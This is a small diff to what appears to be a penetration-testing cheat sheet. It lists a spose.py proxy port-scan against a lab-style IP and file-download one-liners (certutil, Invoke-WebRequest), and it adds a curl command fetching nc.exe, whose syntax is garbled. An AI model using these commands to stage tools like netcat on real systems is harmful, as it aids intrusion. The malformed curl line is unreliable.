@@ -14,6 +14,8 @@ python3 spose.py --proxy http://10.10.11.131:3128 --target 10.10.11.131
 certutil -urlcache -f -split <target>
 
 Invoke-WebRequest <target> -OutFile <Path>
+
+curl -o http://example.com/nc.exe -o nc.exe
 ```
 
 ---
